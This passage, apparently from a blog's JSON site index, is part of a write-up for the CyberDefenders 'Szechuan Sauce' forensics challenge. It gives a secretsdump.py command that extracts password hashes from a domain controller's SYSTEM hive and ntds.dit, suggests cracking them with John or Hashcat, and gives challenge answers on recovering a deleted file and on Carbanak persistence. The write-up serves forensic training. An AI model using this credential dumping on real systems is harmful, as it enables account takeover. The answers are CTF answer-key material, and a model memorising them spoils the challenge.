first method is the easiest one. First, you need to extract files which contains hashes:\nC:\\Windows\\System32\\config\\SYSTEM\nC:\\Windows\\NTDS\\ntds.dit\nThen, use the Python tool to extract hashes and finally crack them with John, Hashcat on an online tool (weak password). To extract hashes with secretsdump.py:\npython secretsdump.py -system \u0026lt;SYSTEM hive path\u0026gt; -ntds \u0026lt;ntds.dit path\u0026gt; -outputfile \u0026lt;path\u0026gt;\nQ17 What was the original filename for Beth’s secrets? # We can suppose that this file has a name like .*secret.* or .*beth.*, we can search a file by its filename with Autopsy (Tools \u0026gt; File Search by Attributes), we will find several files related to Beth_Secret.txt. Plus, Autopsy can read it and give its content.\nQ18 What was the content of Beth’s secret file? ( six words, spaces in between) # Unfortunately, this isn\u0026rsquo;t the correct answer. We can see that the file was deleted (red cross), maybe the file is still in the bin? Go to $Recycle.Bin, there is a folder named like S-1-...-500, 500 is the Administrator\u0026rsquo;s ID, so this folder contains Administrator\u0026rsquo;s deleted files. Inside it, filenames are broken (if you know how filesystem works you already know that is intended), just open each of them, you will find the answer. The very first one contains printable caracters: FileShare\\Secrets\\SECRET_beth.txt and the second one contains its content.\nQ19 The malware tried to obtain persistence in a similar way to how Carbanak malware obtains persistence. What is the corresponding MITRE technique ID? # Tricky question, as you juste have to do some threat hunting; search informations on Cabarnak malware and its persitence method. You will find this website: https://attack.mitre.org/groups/G0008/, search for persistence and its Mitre ID.\n","date":"1 janvier 1","permalink":"/write-up/writeup/","section":"Write-up","summary":"Cyberdefenders · Digital Forensic · Szechuan Sauce # The scenario:","title":""},{"content":"","date":"1 janvier 1","permalink":"/topics/","section":"Topics","summary":"","title":"Topics"}]